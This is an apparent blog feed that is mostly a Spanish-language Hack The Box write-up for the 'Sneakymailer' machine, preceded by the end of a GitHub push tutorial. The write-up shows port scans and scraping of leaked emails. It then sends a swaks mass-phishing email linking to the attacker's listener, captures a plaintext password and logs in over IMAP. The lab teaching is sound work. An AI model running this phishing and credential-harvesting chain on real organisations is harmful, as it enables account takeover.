&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues nos vamos a la opción &lt;code&gt;Developer Settings&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A continuación vamos a la opción &lt;code&gt;Personal Access Token&lt;/code&gt; -&amp;gt; &lt;code&gt;Tokens (classic)&lt;/code&gt; -&amp;gt; &lt;code&gt;Generate New Token&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ingresamos el nombre del token, establecemos un tiempo de expiración y marcamos la opción &lt;code&gt;repo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente damos click en la opción &lt;code&gt;Generate Token&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estos nos mostrara nuestro &lt;code&gt;token&lt;/code&gt; creado el cual debemos copiarlo y ingresarlo en &lt;code&gt;Password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y vemos como todo nuestro codigo se subio a &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
Username for 'https://github.com': f1rtsmiracle
Password for 'https://f1rtsmiracle@github.com': 
Enumerando objetos: 21, listo.
Contando objetos: 100% (21/21), listo.
Compresión delta usando hasta 4 hilos
Comprimiendo objetos: 100% (8/8), listo.
Escribiendo objetos: 100% (21/21), 1.73 KiB | 888.00 KiB/s, listo.
Total 21 (delta 1), reusados 0 (delta 0), pack-reusados 0
remote: Resolving deltas: 100% (1/1), done.
To https://github.com/f1rtsmiracle/mi-primer-repositorio.git
 * [new branch]      main -&amp;gt; main
Rama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origin'.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a nuestro repositorio nuevamente y vemos los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y cada vez que queramos seguir agregando nuevos cambios, lo vamos modificando con nuestro editor de texto preferido, luego nos vamos a la terminal y los agregamos con &lt;code&gt;git add&lt;/code&gt;. Creamos un &lt;code&gt;commit&lt;/code&gt; y finalmente usamos el comando de &lt;code&gt;git push&lt;/code&gt; y con ese vamos a agregar todos nuestros cambios.&lt;/p&gt;

&lt;p&gt;Ahora en caso que estemos creando un nuevo &lt;code&gt;branch&lt;/code&gt; y todavia no queremos hacerle un &lt;code&gt;merge&lt;/code&gt;, pero si queremos subirlo a &lt;code&gt;github&lt;/code&gt;, lo que tenemos que hacer es cambiar de &lt;code&gt;branch&lt;/code&gt; con el comando &lt;code&gt;git checkout nombre_branch&lt;/code&gt; y ejecutamos &lt;code&gt;git push -u nombre_rama&lt;/code&gt; y lo que hara es crear este &lt;code&gt;branch&lt;/code&gt; en el repositorio.&lt;/p&gt;

&lt;p&gt;Espero haberte ayudado, esto seria todo hasta la proxima!!! :)&lt;/p&gt;
</description>
        <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/articulos/Git</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/Git</guid>
        
        <category>Git</category>
        
        <category>Repositorio</category>
        
        <category>Experto</category>
        
        <category>Gratis</category>
        
        <category>Domina</category>
        
        <category>Github</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Sneakymailer - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad &lt;code&gt;media&lt;/code&gt;, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un &lt;code&gt;pypi server&lt;/code&gt; creando un paquete malicioso y finalmente escalaremos privilegios como el usuario &lt;code&gt;root&lt;/code&gt; abusando de un privilegio de sudoers en &lt;code&gt;pip3&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Sneakymailer
❯ ls
 Sneakymailer
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap, content, scripts}
}
❯ mkt
❯ ls
 content   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.197
PING 10.10.10.197 (10.10.10.197) 56(84) bytes of data.
64 bytes from 10.10.10.197: icmp_seq=1 ttl=63 time=2582 ms

--- 10.10.10.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2582.173/2582.173/2582.173/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:19 GMT
Initiating SYN Stealth Scan at 21:19
Scanning 10.10.10.197 [65535 ports]
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Completed SYN Stealth Scan at 21:20, 20.33s elapsed (65535 total ports)
Nmap scan report for 10.10.10.197
Host is up, received user-set (0.31s latency).
Scanned at 2023-04-08 21:19:57 GMT for 20s
Not shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 63
22/tcp   open  ssh        syn-ack ttl 63
25/tcp   open  smtp       syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
143/tcp  open  imap       syn-ack ttl 63
993/tcp  open  imaps      syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
           Raw packets sent: 98589 (4.338MB) | Rcvd: 88844 (3.554MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,25,80,143,993,8080 10.10.10.197 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:21 GMT
Nmap scan report for 10.10.10.197
Host is up (0.40s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http     nginx 1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
|_http-server-header: nginx/1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.06 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.9p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;SMTP&lt;/td&gt;
      &lt;td&gt;Postfix smtpd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;143&lt;/td&gt;
      &lt;td&gt;IMAP&lt;/td&gt;
      &lt;td&gt;Courier Imapd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;993&lt;/td&gt;
      &lt;td&gt;IMAP/SSL&lt;/td&gt;
      &lt;td&gt;Courier Imapd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Comenzando primeramente intentaremos conectarnos como el usuario &lt;code&gt;anonymous&lt;/code&gt; por el servicio &lt;code&gt;ftp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): anonymous
530 Permission denied.
Login failed.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver el gestor de contenido de los servicios &lt;code&gt;http&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.197
http://10.10.10.197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.10.197], RedirectLocation[http://sneakycorp.htb], Title[301 Moved Permanently], nginx[1.14.2]
http://sneakycorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1.14.2]
❯ whatweb http://10.10.10.197:8080
http://10.10.10.197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], Title[Welcome to nginx!], nginx[1.14.2]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;whatweb&lt;/code&gt; nos reporta que se esta aplicando virtual hosting, concretamente al dominio &lt;code&gt;http://sneakycorp.htb&lt;/code&gt; asi que comenzemos agregandolo a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;10.10.10.197 sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a proceder a abrir la pagina web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar un proyecto que nos habla de pypi, pero que es &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos un potencial de correos filtrados de la compañia&lt;/p&gt;

&lt;p&gt;Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre &lt;code&gt;mails.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://sneakycorp.htb/team.php&quot; | grep &quot;sneakymailer&quot; | html2text | xargs | tr ' ' ',' &amp;gt; mails.txt
❯ /bin/cat mails.txt
tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como antes nos reporto &lt;code&gt;nmap&lt;/code&gt; el servicio &lt;code&gt;imap&lt;/code&gt; se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado.&lt;/p&gt;

&lt;p&gt;Para eso usaremos la herramienta &lt;code&gt;swaks&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;para instalar la herramienta solo basta con hacer un apt install swaks&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Especificaremos con los comandos &lt;code&gt;from&lt;/code&gt; el correo origen, &lt;code&gt;--to&lt;/code&gt; la lista de correos que obtuvimos, en el &lt;code&gt;body&lt;/code&gt; podemos tratar de enviar un enlace a un servidor &lt;code&gt;http&lt;/code&gt; que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ swaks --from fmiracle@sneakymailer.htb --to tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb --body &quot;Entra aqui -&amp;gt; http://10.10.16.2/test&quot; --server 10.10.10.197
=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
&amp;lt;-  220 debian ESMTP Postfix (Debian/GNU)
 -&amp;gt; EHLO hack4u
&amp;lt;-  250-debian
&amp;lt;-  250-PIPELINING
&amp;lt;-  250-SIZE 10240000
&amp;lt;-  250-VRFY
&amp;lt;-  250-ETRN
&amp;lt;-  250-STARTTLS
&amp;lt;-  250-ENHANCEDSTATUSCODES
&amp;lt;-  250-8BITMIME
&amp;lt;-  250-DSN
&amp;lt;-  250-SMTPUTF8
&amp;lt;-  250 CHUNKING
 -&amp;gt; MAIL FROM:&amp;lt;fmiracle@sneakymailer.htb&amp;gt;
&amp;lt;-  250 2.1.0 Ok
 -&amp;gt; RCPT TO:&amp;lt;tigernixon@sneakymailer.htb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;80&lt;/code&gt; y recibimos una petición post.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:39458.
POST /test HTTP/1.1
Host: 10.10.16.2
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tramos la data y lo exportamos a un ficherito llamando &lt;code&gt;credentials.txt&lt;/code&gt;, donde podemos ver las credenciales de el usuario &lt;code&gt;Paul&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&quot;);
firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd@sneakymailer.htb&amp;amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht&amp;amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht

❯ /bin/cat credentials.txt
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora provaremos conectarnos con &lt;code&gt;telnet&lt;/code&gt; al puerto &lt;code&gt;143&lt;/code&gt; con esas credenciales.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&quot;&gt;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.197 143
Trying 10.10.10.197...
Connected to 10.10.10.197.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
a1 OK LOGIN Ok.
a2 LIST &quot;&quot; &quot;*&quot;
* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;
a2 OK LIST completed
a3 EXAMINE &quot;INBOX.Trash&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600304] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a3 OK [READ-ONLY] Ok
a4 EXAMINE &quot;INBOX.Sent&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600538] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a4 OK [READ-ONLY] Ok
a5 EXAMINE &quot;INBOX.Deleted Items&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589481592] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a5 OK [READ-ONLY] Ok
a6 EXAMINE &quot;INBOX.Sent Items&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a6 OK [READ-ONLY] Ok
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario &lt;code&gt;developer&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;a7 FETCH 1 BODY[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root &amp;lt;root@debian&amp;gt;
